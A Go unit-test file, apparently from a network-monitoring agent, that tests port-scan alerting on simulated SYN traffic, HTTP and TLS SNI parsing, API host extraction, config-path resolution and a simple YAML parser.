		t.Fatalf("parseHTTPRequest() = %q %q %q %v", method, path, host, ok)
	}
}

func TestBusinessActionForObservation(t *testing.T) {
	if got := businessActionForObservation(trafficObservation{HTTPPath: "/admin/users", Protocol: "TCP"}); got != "admin_access" {
		t.Fatalf("businessActionForObservation() = %q, want admin_access", got)
	}
	if got := businessActionForObservation(trafficObservation{DNSQuery: "example.com", Protocol: "UDP"}); got != "dns_query" {
		t.Fatalf("businessActionForObservation() = %q, want dns_query", got)
	}
}

func TestPortScanDetectorEmitsAlertBeforeTrafficRateLimit(t *testing.T) {
	agent := NewAgent(&Config{TrafficInterface: "ens33"})
	agent.agentID = "agent-ubuntu-dd6dbe2f"
	agent.hostname = "ubuntu"
	agent.localIP = "10.1.18.8"
	detector := newPortScanDetector()
	now := time.Date(2026, 5, 26, 12, 12, 0, 0, time.UTC)
	var alert map[string]interface{}
	for port := uint16(1); port <= 20; port++ {
		alert = detector.observe(trafficObservation{Timestamp: now.Add(time.Duration(port) * time.Millisecond), Engine: "af_packet", Interface: "ens33", SrcIP: "10.1.18.100", DstIP: "10.1.18.8", SrcPort: 50000 + port, DstPort: port, Protocol: "TCP", TCPSYN: true, Direction: "ingress"}, agent)
	}
	if alert == nil {
		t.Fatal("expected port scan alert after 20 distinct destination ports")
	}
	if got := alert["event_type"]; got != "traffic.port_scan" {
		t.Fatalf("event_type = %v, want traffic.port_scan", got)
	}
	if got := alert["agent_id"]; got != "agent-ubuntu-dd6dbe2f" {
		t.Fatalf("agent_id = %v, want dns8 agent id", got)
	}
	if got := alert["dst_ip"]; got != "10.1.18.8" {
		t.Fatalf("dst_ip = %v, want 10.1.18.8", got)
	}
	if got := alert["distinct_dst_ports"]; got != int64(20) {
		t.Fatalf("distinct_dst_ports = %v, want 20", got)
	}
}

func TestPortScanDetectorPrunesExpiredEntries(t *testing.T) {
	detector := newPortScanDetector()
	detector.entries["old"] = &portScanEntry{firstSeen: time.Now().Add(-3 * time.Minute), lastSeen: time.Now().Add(-3 * time.Minute), ports: map[uint16]struct{}{22: {}}}
	detector.prune(time.Now())
	if _, ok := detector.entries["old"]; ok {
		t.Fatal("expected expired port scan entry to be pruned")
	}
}

func TestParseTLSServerNameExtension(t *testing.T) {
	data := []byte{0x00, 0x0e, 0x00, 0x00, 0x0b}
	data = append(data, []byte("example.com")...)
	if got := parseTLSServerNameExtension(data); got != "example.com" {
		t.Fatalf("parseTLSServerNameExtension() = %q, want example.com", got)
	}
}

func TestServerHostFromAPI(t *testing.T) {
	tests := []struct {
		name string
		api  string
		want string
	}{
		{name: "full url", api: "https://example.com:9443/api", want: "example.com"},
		{name: "host only auto add scheme", api: "api.internal:8080", want: "api.internal"},
		{name: "empty", api: "", want: ""},
		{name: "bad url", api: "http://[::1", want: ""},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := serverHostFromAPI(tc.api); got != tc.want {
				t.Fatalf("serverHostFromAPI() = %q, want %q", got, tc.want)
			}
		})
	}
}

func TestResolveConfigPath(t *testing.T) {
	oldConfigFile := os.Getenv("CONFIG_FILE")
	oldAgentConfig := os.Getenv("AGENT_CONFIG")
	t.Cleanup(func() {
		_ = os.Setenv("CONFIG_FILE", oldConfigFile)
		_ = os.Setenv("AGENT_CONFIG", oldAgentConfig)
	})

	t.Run("flag equals has highest priority", func(t *testing.T) {
		_ = os.Unsetenv("CONFIG_FILE")
		_ = os.Unsetenv("AGENT_CONFIG")
		got := resolveConfigPath([]string{"ly-agent", "--config=/tmp/a.yaml"})
		if got != "/tmp/a.yaml" {
			t.Fatalf("resolveConfigPath() = %q, want %q", got, "/tmp/a.yaml")
		}
	})

	t.Run("flag value has priority over env", func(t *testing.T) {
		_ = os.Setenv("CONFIG_FILE", "/tmp/env.yaml")
		_ = os.Unsetenv("AGENT_CONFIG")
		got := resolveConfigPath([]string{"ly-agent", "--config", " /tmp/flag.yaml "})
		if got != "/tmp/flag.yaml" {
			t.Fatalf("resolveConfigPath() = %q, want %q", got, "/tmp/flag.yaml")
		}
	})

	t.Run("config_file env fallback", func(t *testing.T) {
		_ = os.Setenv("CONFIG_FILE", "/tmp/env-config.yaml")
		_ = os.Unsetenv("AGENT_CONFIG")
		got := resolveConfigPath([]string{"ly-agent"})
		if got != "/tmp/env-config.yaml" {
			t.Fatalf("resolveConfigPath() = %q, want %q", got, "/tmp/env-config.yaml")
		}
	})

	t.Run("agent_config env fallback", func(t *testing.T) {
		_ = os.Unsetenv("CONFIG_FILE")
		_ = os.Setenv("AGENT_CONFIG", "/tmp/agent-config.yaml")
		got := resolveConfigPath([]string{"ly-agent"})
		if got != "/tmp/agent-config.yaml" {
			t.Fatalf("resolveConfigPath() = %q, want %q", got, "/tmp/agent-config.yaml")
		}
	})

	t.Run("default fallback", func(t *testing.T) {
		_ = os.Unsetenv("CONFIG_FILE")
		_ = os.Unsetenv("AGENT_CONFIG")
		got := resolveConfigPath([]string{"ly-agent"})
		if got != defaultConfigFile {
			t.Fatalf("resolveConfigPath() = %q, want %q", got, defaultConfigFile)
		}
	})
}

func TestParseSimpleYAML(t *testing.T) {
	dir := t.TempDir()
	configPath := filepath.Join(dir, "agent.yaml")
	content := `
# top-level
server:
  api: "http://127.0.0.1:9000" # inline comment
  redis: '127.0.0.1:6379'
agent:
  id: abc
traffic:
  enabled: true
  interface: eth1
  streams:
    raw: flows:raw
    semantic: flows:semantic
session:
  enabled: true
  stream: sessions:semantic
invalid line without colon
flat_key: flat_value
`
	if err := os.WriteFile(configPath, []byte(content), 0o600); err != nil {
		t.Fatalf("write temp yaml: %v", err)
	}

	vals, err := parseSimpleYAML(configPath)
	if err != nil {
		t.Fatalf("parseSimpleYAML() error = %v", err)
	}

	want := map[string]string{
		"server.api":               "http://127.0.0.1:9000",
		"server.redis":             "127.0.0.1:6379",
		"agent.id":                 "abc",
		"traffic.enabled":          "true",
		"traffic.interface":        "eth1",
		"traffic.streams.raw":      "flows:raw",
		"traffic.streams.semantic": "flows:semantic",
		"session.enabled":          "true",
		"session.stream":           "sessions:semantic",
		"flat_key":                 "flat_value",
	}

	for k, v := range want {
		if got := vals[k]; got != v {
			t.Fatalf("parseSimpleYAML()[%q] = %q, want %q", k, got, v)
		}
	}
}
